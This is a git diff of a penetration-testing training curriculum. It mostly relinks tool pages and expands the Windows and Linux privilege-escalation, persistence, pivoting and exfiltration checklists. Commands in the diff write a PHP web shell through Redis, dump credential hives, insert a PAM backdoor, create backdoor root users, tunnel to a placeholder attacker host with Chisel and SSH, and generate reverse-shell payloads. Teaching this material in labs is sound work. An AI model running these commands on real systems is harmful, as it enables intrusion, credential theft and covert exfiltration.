@@ -24,7 +24,7 @@
 > Every attack you execute must be documented. Required artifacts:
 >
 > - **Pentest notes** in structured markdown (target → recon → exploitation → post-exploitation → findings)
-> - **Tool output** — [Nmap](../Tools/Nmap.md) scans, Burp captures, [Metasploit](../Tools/Metasploit_Framework.md) session logs saved to files
+> - **Tool output** — [Nmap](Tools/Nmap.md) scans, Burp captures, [Metasploit](Tools/Metasploit_Framework.md) session logs saved to files
 > - **Attack chain diagrams** showing the kill chain for each compromise
 > - **3 HTB/VulnHub writeups** — full writeups committed to Git (private until published)
 > - **Git commits** — commit after every lab session with descriptive messages
@@ -254,7 +254,7 @@
 
 - [ ] **Aggressive DNS Interrogation:** Use **nslookup and dig** to force the disclosure of hidden internal records or mail servers.
 
-- [ ] **Web Content Discovery:** Run **[ffuf](../Tools/ffuf.md) or [Gobuster](../Tools/Gobuster.md)** for directory brute-forcing and use **Wappalyzer** for technology profiling (CMS, frameworks, databases).
+- [ ] **Web Content Discovery:** Run **[ffuf](Tools/ffuf.md) or [Gobuster](Tools/Gobuster.md)** for directory brute-forcing and use **Wappalyzer** for technology profiling (CMS, frameworks, databases).
 
 - [ ] **TLS Surface:** Harvest **cert SANs**, check **cipher/curve** support, **HTTP/2/ALPN** negotiation, and redirect/downgrade behavior.
 
@@ -269,7 +269,7 @@
 > [!TIP]
 > **Goal:** Understand the defensive "brain" of the target.
 
-- [ ] **Traffic Analysis:** If vantage is gained, use **[Wireshark](../Tools/Wireshark.md)** to analyze **Packet Captures** and examine **Handshakes** for encryption/auth weaknesses.
+- [ ] **Traffic Analysis:** If vantage is gained, use **[Wireshark](Tools/Wireshark.md)** to analyze **Packet Captures** and examine **Handshakes** for encryption/auth weaknesses.
 
 - [ ] **Defensive Profiling:** Identify the presence of **IDS/IPS, SIEM, SOAR, and EDR/DLP**. If found, slow down your operation immediately.
 
@@ -292,7 +292,7 @@
 
 - [ ] **DHCPv6 Enumeration:** Use **DHCPv6 client** to extract **prefix, DNS servers, domain names** from DHCP responses.
 
-- [ ] **SNMP Enumeration:** Query **SNMP community [strings](../Tools/strings.md)** (public/private) on discovered hosts to extract **routing tables, interface info, system description**.
+- [ ] **SNMP Enumeration:** Query **SNMP community [strings](Tools/strings.md)** (public/private) on discovered hosts to extract **routing tables, interface info, system description**.
 
 - [ ] **LDAP Probing:** Query **LDAP** on **port 389** to enumerate **users, groups, organizational structure, computer objects**.
 
@@ -393,7 +393,7 @@
 
 - [ ] **Passive Traffic Capture:** Utilize **Wireshark** to capture broadcast traffic, revealing active hosts without sending a single packet.
 
-- [ ] **Network Pathing & Perimeter Analysis:** Deploy `tracert` or `[hping3](../Tools/hping3.md) --traceroute` to map hops and define **Perimeter vs DMZ vs Segmentation** boundaries.
+- [ ] **Network Pathing & Perimeter Analysis:** Deploy `tracert` or `[hping3](Tools/hping3.md) --traceroute` to map hops and define **Perimeter vs DMZ vs Segmentation** boundaries.
 
 - [ ] **IPv6 Discovery:** Include **NDP/`nmap -6`** sweeps for dual-stack assets and SLAAC-derived hosts.
 
@@ -475,7 +475,7 @@
 
 - [ ] **Source Port Spoofing:** Use `--source-port 53/80` to impersonate **DNS/HTTP traffic** and bypass port-based **ACL rules**.
 
-- [ ] **Packet Manipulation:** Craft **custom packets** with **[Scapy](../Tools/Scapy.md)** to evade **DPI (Deep Packet Inspection)** and **pattern-matching filters**.
+- [ ] **Packet Manipulation:** Craft **custom packets** with **[Scapy](Tools/Scapy.md)** to evade **DPI (Deep Packet Inspection)** and **pattern-matching filters**.
 
 ---
 
@@ -537,9 +537,9 @@
 > [!TIP]
 > **Goal:** Extract version, configuration, and identity information from each discovered service.
 
-- [ ] **Banner Grabbing:** Use **[Netcat](../Tools/Netcat.md), Telnet, Nmap -sV** to capture **service banners** revealing **software name, version, OS hints, and build information**.
+- [ ] **Banner Grabbing:** Use **[Netcat](Tools/Netcat.md), Telnet, Nmap -sV** to capture **service banners** revealing **software name, version, OS hints, and build information**.
 
-- [ ] **SMB Enumeration:** Use **enum4linux-ng, smbclient, [NetExec](../Tools/NetExec.md) (nxc)** to list **shares, users, groups, permissions, null sessions, and password policies** on Windows/Samba hosts.
+- [ ] **SMB Enumeration:** Use **enum4linux-ng, smbclient, [NetExec](Tools/NetExec.md) (nxc)** to list **shares, users, groups, permissions, null sessions, and password policies** on Windows/Samba hosts.
 
 - [ ] **SNMP Enumeration:** Query **SNMP (UDP 161)** with **snmpwalk, onesixtyone** using **community strings (public/private)** to extract **system info, interfaces, running processes, installed software**.
 
@@ -560,7 +560,7 @@
 
 - [ ] **LDAP Enumeration:** Query **LDAP** (port 389) to extract **users, groups, computers, password policies** without authentication.
 
-- [ ] **Active Directory Recon:** Use **ldapsearch, enum4linux-ng, [BloodHound](../Tools/BloodHound.md)** to map **domain trusts, group membership, SPNs, delegation**.
+- [ ] **Active Directory Recon:** Use **ldapsearch, enum4linux-ng, [BloodHound](Tools/BloodHound.md)** to map **domain trusts, group membership, SPNs, delegation**.
 
 - [ ] **Kerberos Enumeration:** Use **kerbrute** for **username enumeration** via **AS-REQ responses**; identify **accounts without pre-authentication (AS-REP Roastable)**.
 
@@ -771,7 +771,7 @@
 - [ ] **Config Rewrite RCE (Web Shell):**
 
   ```bash
-  redis-cli -h <target> CONFIG [SET](../Tools/SET.md) dir /var/www/html
+  redis-cli -h <target> CONFIG [SET](Tools/SET.md) dir /var/www/html
   redis-cli -h <target> CONFIG SET dbfilename shell.php
   redis-cli -h <target> SET payload '<?php system($_GET["cmd"]); ?>'
   redis-cli -h <target> SAVE
@@ -880,9 +880,9 @@
 > [!TIP]
 > **Goal:** Apply the right technique to each hash type.
 
-- [ ] **[Hashcat](../Tools/Hashcat.md) Fundamentals:** Master **attack modes (-a 0 dictionary, -a 1 combination, -a 3 brute/mask, -a 6/7 hybrid)**, GPU acceleration, session management, and potfile usage.
+- [ ] **[Hashcat](Tools/Hashcat.md) Fundamentals:** Master **attack modes (-a 0 dictionary, -a 1 combination, -a 3 brute/mask, -a 6/7 hybrid)**, GPU acceleration, session management, and potfile usage.
 
-- [ ] **[John the Ripper](../Tools/John_the_Ripper.md):** Use **JtR** for format auto-detection, **incremental mode, wordlist mode, rules**, and cracking **non-GPU-friendly formats** (bcrypt, Argon2).
+- [ ] **[John the Ripper](Tools/John_the_Ripper.md):** Use **JtR** for format auto-detection, **incremental mode, wordlist mode, rules**, and cracking **non-GPU-friendly formats** (bcrypt, Argon2).
 
 - [ ] **Dictionary Attacks:** Use curated wordlists — **rockyou.txt, SecLists, weakpass, kaonashi** — as the first pass against any hash.
 
@@ -903,7 +903,7 @@
 > [!TIP]
 > **Goal:** Crack hashes captured from real network protocols.
 
-- [ ] **NTLM / NetNTLMv2:** Capture with **[Responder](../Tools/Responder.md), ntlmrelayx**; crack with **hashcat -m 5600**; understand why NTLMv2 is harder than NTLMv1.
+- [ ] **NTLM / NetNTLMv2:** Capture with **[Responder](Tools/Responder.md), ntlmrelayx**; crack with **hashcat -m 5600**; understand why NTLMv2 is harder than NTLMv1.
 
 - [ ] **Kerberos Tickets:** Crack **Kerberoasted TGS (-m 13100)** and **AS-REP hashes (-m 18200)** offline with hashcat using targeted service-account wordlists.
 
@@ -987,7 +987,7 @@
 
 **Credential Assault:**
 
-- [ ] **Brute Force:** Methodical password guessing with **wordlists, rule-based mangling** — use **[Hydra](../Tools/Hydra.md)** for online service brute-forcing (SSH, FTP, HTTP, RDP, SMB, WinRM) and **[Hashcat](../Tools/Hashcat.md)** + **[John the Ripper](../Tools/John_the_Ripper.md)** for offline hash cracking.
+- [ ] **Brute Force:** Methodical password guessing with **wordlists, rule-based mangling** — use **[Hydra](Tools/Hydra.md)** for online service brute-forcing (SSH, FTP, HTTP, RDP, SMB, WinRM) and **[Hashcat](Tools/Hashcat.md)** + **[John the Ripper](Tools/John_the_Ripper.md)** for offline hash cracking.
 
 - [ ] **Password Spray:** Low-and-slow attacks across many accounts to avoid lockout.
 
@@ -1013,7 +1013,7 @@
 
 > **📌 Cross-Reference:** ARP spoofing, DNS spoofing, SSL stripping, and MITM techniques are taught in detail in **Part 9: Sniffing & Spoofing** (Phases 3–4). WiFi evil twin attacks are covered in **Part 21: Wireless Pentesting**. The techniques here focus on using these as delivery mechanisms for social engineering — review Part 9 first.
 
-- [ ] **NGO Interception:** Capture traffic at **network gateways/bridges** with **[tcpdump](../Tools/tcpdump.md)/Wireshark**.
+- [ ] **NGO Interception:** Capture traffic at **network gateways/bridges** with **[tcpdump](Tools/tcpdump.md)/Wireshark**.
 
 ---
 
@@ -1031,7 +1031,7 @@
 
 **Step 0 — Enumeration (Always First):**
 
-- [ ] **Automated Enumeration:** Run **winPEAS** (`[winpeas](../Tools/WinPEAS.md).exe`) — read every orange and red finding; do not blindly exploit suggestions. Also run **PowerUp** (`Import-Module PowerUp.ps1; Invoke-AllChecks`) for PowerShell-based checks, and **Seatbelt** for host situational awareness (token privileges, installed software, AppLocker policy).
+- [ ] **Automated Enumeration:** Run **winPEAS** (`[winpeas](Tools/WinPEAS.md).exe`) — read every orange and red finding; do not blindly exploit suggestions. Also run **PowerUp** (`Import-Module PowerUp.ps1; Invoke-AllChecks`) for PowerShell-based checks, and **Seatbelt** for host situational awareness (token privileges, installed software, AppLocker policy).
 
 - [ ] **Manual Baseline Commands:** On foothold, immediately run:
   - `whoami /priv` — check token privileges (SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege are all exploitable)
@@ -1059,7 +1059,7 @@
 **Vector 2: DLL Hijacking**
 
 - [ ] **DLL Search Order Abuse:** When an application loads a DLL by name without an absolute path, Windows searches: application directory → `%SYSTEMROOT%\System32` → `%SYSTEMROOT%` → directories in `%PATH%`. If you can write to a directory searched before the legitimate DLL location, drop a malicious DLL with the same name.
-  - Discovery: **[Procmon](../Tools/Procmon.md)** (Sysinternals) — filter by `Result = NAME NOT FOUND` + `Path ends with .dll` while running the target application to find missing DLLs
+  - Discovery: **[Procmon](Tools/Procmon.md)** (Sysinternals) — filter by `Result = NAME NOT FOUND` + `Path ends with .dll` while running the target application to find missing DLLs
 
 - [ ] **DLL Proxying:** Place a malicious DLL that loads the real DLL and also executes a payload — allows transparent hijack without breaking application functionality.
 
@@ -1068,27 +1068,45 @@
 **Vector 3: Token Impersonation & Potato Exploits**
 
 - [ ] **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege:** These privileges (held by IIS service accounts, SQL Server service, local service) allow impersonating any token, including SYSTEM. This is the most common path from `NT AUTHORITY\NETWORK SERVICE` → SYSTEM.
-  - **PrintSpoofer** (Windows 10/2019+): `PrintSpoofer.exe -i -c powershell.exe`
+  - **PrintSpoofer** (Windows 10/2019+): `PrintSpoofer.exe -i -c powershell.exe` (named pipe impersonation via spoolsv)
   - **JuicyPotato** (Windows Server 2016 and below): requires a CLSID for a COM server running as SYSTEM
-  - **GodPotato** (Windows 2012–2022, all versions): `GodPotato.exe -cmd "cmd /c whoami > C:\result.txt"`
-  - **RoguePotato**: Works when JuicyPotato CLSID restrictions apply
+  - **GodPotato** (Windows 2012–2022, all versions): `GodPotato.exe -cmd "cmd /c whoami > C:\result.txt"` (abuses DCOM / storage interface)
+  - **SweetPotato / BadPotato / RoguePotato**: Versatile potato variants bypassing DCOM activation restrictions
   - Discovery: `whoami /priv` → look for `SeImpersonatePrivilege Enabled`
 
-- [ ] **Token Duplication (SeDebugPrivilege):** With `SeDebugPrivilege`, open any process including LSASS and winlogon.exe, steal their tokens, and impersonate SYSTEM.
-  - Tools: `incognito.exe`, Meterpreter `getsystem`
+- [ ] **Token Duplication (SeDebugPrivilege):** With `SeDebugPrivilege`, attach to any running process including LSASS and winlogon.exe, duplicate their tokens, and impersonate SYSTEM or dump credentials.
+  - Tools: `incognito.exe`, Meterpreter `getsystem`, custom Win32 token duplicate scripts
 
-**Vector 4: UAC Bypass**
+- [ ] **Data Extraction via SeBackupPrivilege & SeRestorePrivilege:**
+  - `SeBackupPrivilege`: Grants full read access to any file on the system regardless of NTFS permissions.
+    - Exploit: Dump SAM and SYSTEM hives directly: `reg save HKLM\SAM C:\temp\sam` & `reg save HKLM\SYSTEM C:\temp\system`, or copy locked `NTDS.dit` via robocopy/diskshadow.
+  - `SeRestorePrivilege`: Grants full write access to any file on disk.
+    - Exploit: Overwrite service binaries or replace system DLLs / sticky keys (`sethc.exe`) to obtain SYSTEM execution.
 
-- [ ] **UAC Mechanism:** User Account Control elevates processes that request it. Only processes with an auto-elevation manifest bypass the UAC prompt. Most UAC bypass techniques involve abusing auto-elevated trusted Windows binaries.
+- [ ] **SeTakeOwnershipPrivilege:** Allows user to take ownership of any securable object (files, registry keys).
+  - Exploit: Take ownership using `takeown /f C:\Windows\System32\utilman.exe` and grant full control via `icacls`, then substitute with payload.
 
-- [ ] **Technique Examples (Enumerated by UACME Project):**
-  - `fodhelper.exe` bypass (Method 33): modify `HKCU\Software\Classes\ms-settings\shell\open\command` registry key — auto-elevated binary loads the key with no prompt
-  - `eventvwr.exe` bypass (Method 32): similar registry hijack under `HKCU\Software\Classes\mscfile\shell\open\command`
-  - `sdclt.exe` bypass (Method 45): uses `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths`
-  - Discovery: UACME project lists 60+ UAC bypass methods by Windows version
-  - Detection signature: Look for HKCU registry keys being written before auto-elevated binary execution in Sysmon Event ID 13
+**Vector 4: UAC Bypass Mechanics**
 
-- [ ] **UAC Level Check:** `REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` — UAC is disabled if `EnableLUA = 0` (no bypass needed); confirm with `REG QUERY ... /v ConsentPromptBehaviorAdmin` (value 0 = never prompt = bypass trivial)
+- [ ] **UAC Architecture & Integrity Levels:** User Account Control isolates standard users and elevated administrators via Integrity Levels (Low, Medium, High, System). Standard admin accounts run in Medium Integrity by default; UAC bypasses allow moving from Medium Integrity to High Integrity silently without triggering a Consent UI prompt.
+
+- [ ] **Auto-Elevation Abuse & Registry Hijacking (UACME Project):**
+  - Trusted binaries with `autoElevate = true` embedded in their manifest run at High Integrity without prompting if signed by Microsoft.
+  - `fodhelper.exe` (Method 33): modifies `HKCU:\Software\Classes\ms-settings\Shell\Open\command` with delegateExecute property.
+  - `eventvwr.exe` (Method 32): registry hijack under `HKCU:\Software\Classes\mscfile\shell\open\command`.
+  - `sdclt.exe` (Method 45): abuses `HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`.
+  - Detection signature: Monitor `Sysmon Event ID 12/13` (Registry Key Create/Set) targeting user registry hives followed immediately by auto-elevating system binaries.
+
+- [ ] **Mock Directories & Path Spoofing:**
+  - Windows auto-elevation checks verify if an executable resides in `C:\Windows\System32`.
+  - By creating a mock folder with a trailing space using extended path syntax (`\\?\C:\Windows \System32`), an attacker can place a malicious executable or DLL that bypasses the path validation check because the API normalizes the space during evaluation.
+
+- [ ] **Auto-Elevate DLL Hijacking & COM Elevation:**
+  - Injecting payloads into search paths of auto-elevating binaries (e.g., `mmc.exe`, `winsat.exe`) that load non-existent system DLLs.
+  - Elevated COM interfaces: Abusing `IFileOperation` with COM elevation moniker to copy malicious files into protected directories like `C:\Program Files\` or `C:\Windows\System32\` from Medium integrity.
+  - Abusing Microsoft Connection Manager Profile Installer (`cmstp.exe`) with a crafted INF file to trigger elevated execution.
+
+- [ ] **UAC Level Verification:** `REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` — confirm UAC status (`0` = disabled); check `ConsentPromptBehaviorAdmin` (`0` = elevate silently without prompt).
 
 **Vector 5: Registry Privilege Abuse**
 
@@ -1140,6 +1158,20 @@
 
 - [ ] **Exploit Suggester:** After `systeminfo`, paste output into **Windows-Exploit-Suggester-NG** (`wesng.py`): `python wesng.py --update; python wesng.py systeminfo.txt` — cross-references patches against known CVEs.
 
+**Vector 9: Windows Token Privileges & Impersonation (The Potato Family)**
+
+- [ ] **Token Privilege Inspection:** Run `whoami /priv` immediately upon obtaining a Windows shell. Identify high-risk privileges:
+  - `SeImpersonatePrivilege` & `SeAssignPrimaryTokenPrivilege`: Standard on service accounts (IIS, MSSQL, Network Service). Allows impersonating tokens of authenticated local clients to escalate directly to `NT AUTHORITY\SYSTEM`.
+  - `SeDebugPrivilege`: Allows process debugging — attach to and dump `lsass.exe` memory or inject shellcode into any SYSTEM process.
+  - `SeBackupPrivilege` / `SeRestorePrivilege`: Bypass NTFS file system ACLs to read SAM/SYSTEM hives or `NTDS.dit`.
+  - `SeTakeOwnershipPrivilege`: Take ownership of protected system binaries, edit ACLs via `icacls`, and replace binaries with payloads.
+  - `SeLoadDriverPrivilege`: Load vulnerable signed third-party drivers to execute ring-0 kernel code (BYOVD - Bring Your Own Vulnerable Driver).
+
+- [ ] **Impersonation Tooling & Evolution:**
+  - **PrintSpoofer & PipePotato:** Abuses the Windows Print Spooler service via named pipe impersonation (`PrintSpoofer.exe -i -c cmd.exe`). Works reliably on Windows 10, 11, Server 2016, and Server 2019.
+  - **GodPotato & SweetPotato:** Universal token impersonation using DCOM/RPC on Windows Server 2019 and 2022 where legacy DCOM reflection is patched.
+  - **JuicyPotato:** Legacy DCOM reflection for Windows Server 2008/2012/2016 (mitigated on Server 2019+).
+
 **Windows Privesc Lab Targets:**
 
 > [!TIP]
@@ -1175,7 +1207,7 @@
 **Linux Privilege Escalation:**
 
 > [!IMPORTANT]
-> **Why This Needs Its Own Methodology:** Linux privesc is the most consistently tested domain on OSCP, HTB, and real-world Linux engagements. The five bullets below are not enough. Work through each vector with a dedicated lab VM (try Tryhackme "Linux PrivEsc" room, HackTheBox Jarvis/Sunday, or build your own with intentional misconfigs). **[LinPEAS](../Tools/LinPEAS.md)** and **Linux Smart Enumeration (lse.sh)** automate discovery — but you must understand every finding manually before relying on automation.
+> **Why This Needs Its Own Methodology:** Linux privesc is the most consistently tested domain on OSCP, HTB, and real-world Linux engagements. The five bullets below are not enough. Work through each vector with a dedicated lab VM (try Tryhackme "Linux PrivEsc" room, HackTheBox Jarvis/Sunday, or build your own with intentional misconfigs). **[LinPEAS](Tools/LinPEAS.md)** and **Linux Smart Enumeration (lse.sh)** automate discovery — but you must understand every finding manually before relying on automation.
 
 **Step 0 — Enumeration (Always First):**
 
@@ -1273,6 +1305,11 @@
 
 - [ ] **Weak File Permissions on Critical Binaries:** `ls -la /usr/bin/<service>` — if a service binary is world-writable, replace it.
 
+**Vector 9 — Linux PAM & Authentication Architecture Abuse:**
+
+- [ ] **PAM Configuration Flaws:** Audit `/etc/pam.d/` (`common-auth`, `sudo`, `sshd`) for overly permissive `sufficient` or `optional` configurations.
+- [ ] **PAM Backdoor Injection:** Exploit write permissions on `/etc/pam.d/` or `/lib/security/` to insert `pam_exec.so` backdoors (`auth optional pam_exec.so seteuid /tmp/backdoor.sh`) or custom PAM modules that capture plaintext passwords or allow universal login passwords across all local users.
+
 **Linux Privesc Lab Targets (Recommended Practice):**
 
 | Platform    | Machine/Room            | Primary Vectors Covered              |
@@ -1324,39 +1361,53 @@
 > [!TIP]
 > **Goal:** Establish permanent presence and move horizontally across network.
 
-**Credential Harvesting & Token Abuse:**
+**Credential Harvesting & Local Authentication Abuse:**
 
-- [ ] **Pass-the-Hash:** Capture **NTLM hashes** and re-authenticate without cracking passwords.
+- [ ] **Pass-the-Hash (Workgroup):** Capture **local NTLM hashes** (via SAM or LSASS) and authenticate against adjacent workgroup hosts without cracking passwords. *(Note: Kerberos Pass-the-Ticket and Golden/Silver Tickets are explicitly taught in Phase 6).*
 
-- [ ] **Pass-the-Ticket:** Steal **Kerberos TGS tickets** to access **network services as compromised user**.
+- [ ] **LSASS Dumping:** Extract **plaintext credentials and NTLM hashes** via **mimikatz, procdump, comsvcs.dll**, or PowerShell reflection. Understand Credential Guard and PPL protections.
 
-- [ ] **LSASS Dumping:** Extract **plaintext creds, hashes** via **mimikatz, procdump, comsvcs.dll**.
+- [ ] **Browser & Token Harvesting:** Extract stored browser credentials and session cookies from disk/memory (`dpapi`, SQLite databases).
 
-- [ ] **Browser/SSO Token Theft:** Harvest **OAuth/SAML tokens, session cookies** from **memory or storage**.
+- [ ] **SSH Key Harvesting:** Steal **unencrypted private keys** from `~/.ssh/id_rsa`, `known_hosts`, and hijacked SSH agent sockets (`SSH_AUTH_SOCK`).
 
-- [ ] **SSH Key Harvesting:** Steal **private keys** from **~/.ssh/id_rsa, agent sockets**.
+**Userland & Service Persistence:**
 
-**Malware & Backdoors:**
+- [ ] **Registry & Autorun Persistence:** Install persistence via Windows **Run/RunOnce keys, Startup folder, or Winlogon Userinit** for automatic re-execution upon login.
 
-- [ ] **Rootkit Deployment:** Hide **files, processes, ports** via **kernel-mode rootkit** for **deep persistence**.
+- [ ] **Scheduled Tasks & Services:** Configure persistent execution using `schtasks /create` or creating Windows Services (`sc create`) executing as SYSTEM.
 
-- [ ] **Trojan Backdoors:** Deploy **reverse shells, C2 beacons** disguised as **legitimate services**.
+- [ ] **Linux Cron & Systemd Persistence:** Install cron jobs (`/etc/crontab`, `/var/spool/cron/crontabs/`) or deploy custom systemd unit services.
 
-- [ ] **Bootkit/UEFI Implants:** Achieve **pre-OS persistence** via **bootloader compromise**.
+- [ ] **SSH & Account Backdoors:** Append attacker public keys to `~/.ssh/authorized_keys` or create backdoor local administrator/sudo users (`net user /add` or `useradd -ou 0 -g 0`).
 
-- [ ] **Web Shell Placement:** Upload **ASP.NET, PHP, JSP** shells to **web-root** for **persistent access**.
+- [ ] **Web Shell Placement:** Upload lightweight web shells (PHP, ASP.NET, JSP) to writable web roots for out-of-band foothold retention. *(Note: Kernel rootkits and UEFI bootkits are advanced low-level techniques covered in Phase 7).*
 
-- [ ] **Cron/Registry Backdoors:** Install **cron jobs, registry RunOnce** for **automatic re-execution**.
+**Lateral Movement, Pivoting & Egress Evasion:**
 
-**Lateral Movement & Pivoting:**
+- [ ] **SMB/WinRM:** Use **PsExec, Invoke-Command, Evil-WinRM, WMIexec** to execute **commands on adjacent machines**.
 
-- [ ] **SMB/WinRM:** Use **PsExec, Invoke-Command** to execute **commands on adjacent machines**.
+- [ ] **Network Pivoting & SOCKS Tunneling (Multi-Homed Routing):**
+  - **Chisel:** SOCKS5 reverse proxy over HTTP/WebSockets:
+    - Attacker (server): `chisel server --reverse --port 8080`
+    - Compromised Pivot (client): `chisel client <attacker_ip>:8080 R:1080:socks`
+    - Route commands via `proxychains4 -q nmap -sT -Pn -p 80,445 10.10.10.x`
+  - **Ligolo-ng:** High-performance TUN interface tunneling without proxychains overhead:
+    - Set up `proxy` on attacker, create `ligolo` TUN interface (`sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up`).
+    - Run `agent` on victim host, connect back, establish session, and add kernel routing table rule (`sudo ip route add 172.16.1.0/24 dev ligolo`).
+  - **SSH Dynamic Port Forwarding:** `ssh -D 1080 -N -f user@pivot_host` (creates local SOCKS4/5 proxy on port 1080).
+  - **SSH Local & Remote Forwarding:**
+    - Local: `ssh -L 8443:internal_host:443 user@pivot_host` (access internal HTTPS service directly via localhost:8443).
+    - Remote: `ssh -R 4444:attacker_ip:4444 user@pivot_host` (forward internal reverse shell to attacker listener).
 
-- [ ] **SSH Agent Hijack:** Compromise **SSH forwarding** to move to **key-trusted hosts**.
+- [ ] **Egress Filtering Bypass & Covert Exfiltration:**
+  - **DNS Tunneling:** When all outbound TCP/UDP is blocked except internal recursive DNS: deploy `dnscat2` or `iodine` to encapsulate arbitrary TCP traffic and command shells inside Base32/Base64 DNS TXT and CNAME queries.
+  - **ICMP Payloads:** When Layer 4 is blocked but ping is permitted: exfiltrate data byte-by-byte using crafted ICMP echo request data fields (`nping --icmp`, `icmpsh`).
+  - **HTTPS & CDN Fronting:** Wrap outbound command/control and data exfiltration inside trusted SaaS protocols (HTTPS webhooks to Discord, Slack, Telegram, or Google Drive API) to blend into legitimate enterprise telemetry.
+
+- [ ] **SSH Agent Hijack:** Compromise **SSH forwarding** (`SSH_AUTH_SOCK`) to move to **key-trusted hosts**.
 
 - [ ] **RDP Relay/NTLM Relay:** Exploit **weak signing** to relay **RDP/HTTP credentials** to **other systems**.
-
-- [ ] **DNS Exfiltration:** Tunnel **data over DNS queries** to exfiltrate **files incrementally**.
 
 - [ ] **Printer/SNMP Abuse:** Exploit **print servers, SNMP v1/v2c** for **lateral access**.
 
@@ -1499,27 +1550,27 @@
   >
   > **Initial Access**
   >
-  > - [ ] Exploit at least 3 different initial access vectors (SQLi, buffer overflow, phishing payload, or file upload bypass) on lab targets and produce a working shell
-  > - [ ] Enumerate a target using only `nmap`, `gobuster`, and `linpeas`/`winpeas` without automated exploitation frameworks as a first pass
+  > - [ ] Exploit at least 3 different standalone host initial access vectors (e.g., exposed vulnerable network service like vsftpd/Samba/Apache, default/weak credentials on SSH/SMB/RDP, unauthenticated service abuse like Redis/NFS/MySQL, or a staged client script payload) on lab targets and produce a working interactive shell
+  > - [ ] Enumerate a target using only `nmap`, directory bruteforcing (`gobuster`/`ffuf`), and manual inspection without automated vulnerability scanners (`OpenVAS`/`Nessus`) or automated exploit frameworks as a first pass
   >
   > **Windows Privilege Escalation**
   >
-  > - [ ] Achieve SYSTEM from a low-privilege foothold using at least 2 different vectors (UAC bypass, service misconfiguration, token impersonation, or DLL hijacking)
+  > - [ ] Achieve SYSTEM from a low-privilege foothold using at least 2 different vectors from the 9-vector methodology above (e.g., Potato token impersonation like SweetPotato/GodPotato for `SeImpersonatePrivilege`, unquoted service path, weak service binary permissions, AlwaysInstallElevated MSI abuse, or modern UAC bypass)
   > - [ ] Run `winPEAS` and manually interpret every orange/red finding without relying on auto-exploitation
   >
   > **Linux Privilege Escalation**
   >
-  > - [ ] Achieve root from a low-privilege foothold using at least 3 different vectors from the 8-vector methodology above (SUID, sudo misconfiguration, cron job, capabilities, writable file, NFS, kernel, or config leak)
+  > - [ ] Achieve root from a low-privilege foothold using at least 3 different vectors from the 9-vector methodology above (SUID/SGID, sudo misconfigurations, cron job/timer abuse, Linux capabilities, writable system/library files, NFS root squashing, kernel exploits, credential/config file leaks, or PAM module abuse)
   > - [ ] Complete at least 1 of: TryHackMe "Linux PrivEsc" room, HackTheBox Jarvis, or HackTheBox Cronos — with a written walkthrough
   >
   > **Persistence & Lateral Movement**
   >
-  > - [ ] Demonstrate 2 Windows persistence mechanisms (registry RunKey, scheduled task, service installation) and identify their Event Log artifacts
-  > - [ ] Successfully move laterally using Pass-the-Hash or Pass-the-Ticket in a lab Active Directory environment
+  > - [ ] Demonstrate 2 Windows persistence mechanisms (registry RunKey, scheduled task, service installation) and identify their Event Log artifacts (Event ID 4688, 7045, 4698)
+  > - [ ] Demonstrate host-to-host lateral movement or pivoting in a workgroup/local network lab (e.g., local administrator credential reuse via SMB/WinRM Pass-the-Hash, SSH key harvesting/pivoting, or network tunneling via Chisel/SSH to access an internal subnet). *(Note: Active Directory Kerberos Pass-the-Ticket is strictly tested in Phase 6).*
   >
   > **Defense Evasion**
   >
-  > - [ ] Identify what EDR/AV telemetry each technique generates and document a detection gap for at least 1 technique
+  > - [ ] Identify what EDR/AV telemetry each technique generates (Sysmon Event ID 1 process creation, Event ID 10 process access) and document a detection gap for at least 1 technique
   >
   > **Reporting**
   >
@@ -1618,7 +1669,7 @@
 
 - [ ] **Staged Payload Architecture:** Understand the difference between **stageless** (one-shot complete payload) and **staged** (stager fetches the full payload at runtime) delivery — know why staged reduces initial payload size but requires an active C2 listener. Use `msfvenom` to generate both and compare their byte sizes and detection rates against VirusTotal (educational only — never upload customer/lab-specific payloads).
 
-- [ ] **Framework-Managed C2:** Deploy **[Sliver](../Tools/Sliver.md)** or **Mythic** in your lab, generate an implant, and establish a callback — understand listener configuration, sleep/jitter tuning, and how traffic patterns affect detection. This is the operational-tool-based weaponization that is in scope at this stage.
+- [ ] **Framework-Managed C2:** Deploy **[Sliver](Tools/Sliver.md)** or **Mythic** in your lab, generate an implant, and establish a callback — understand listener configuration, sleep/jitter tuning, and how traffic patterns affect detection. This is the operational-tool-based weaponization that is in scope at this stage.
 
 > **🔬 Observation Lab (Stage 2):** Run EICAR test file (`https://www.eicar.org/download/eicar.com`) through VirusTotal and note detection rate. Then generate an msfvenom stageless payload (`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o stageless.exe`) and a staged payload (`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o staged.exe`). Compare: (1) file sizes, (2) VirusTotal detection rates for both. Record which AV engines flag them and whether detections are signature-based or heuristic. Never execute either payload outside a controlled lab VM with no network access.
 
@@ -1815,7 +1866,7 @@
 > [!TIP]
 > **Goal:** Inject false information into the network to redirect or manipulate traffic.
 
-- [ ] **ARP Spoofing:** Flood the network with **gratuitous ARP packets** linking your MAC to the **gateway IP**; forces the switch to route victim traffic through you; use **arpspoof, dsniff, b[ettercap](../Tools/Ettercap.md)**.
+- [ ] **ARP Spoofing:** Flood the network with **gratuitous ARP packets** linking your MAC to the **gateway IP**; forces the switch to route victim traffic through you; use **arpspoof, dsniff, b[ettercap](Tools/Ettercap.md)**.
 
 - [ ] **DNS Spoofing:** Respond to **DNS queries faster than the legitimate server**; redirect victims to malicious login pages for **credential harvesting** or **malware distribution**.
 
@@ -1836,7 +1887,7 @@
 > [!TIP]
 > **Goal:** Intercept, modify, and relay traffic to extract or manipulate data.
 
-- [ ] **MITM Positioning:** Establish yourself between victim and gateway via **ARP spoofing, DNS redirection, rogue DHCP, or rogue AP**; use **ettercap, mitmproxy, [Burp Suite](../Tools/Burp_Suite.md)** to intercept and modify traffic in real-time.
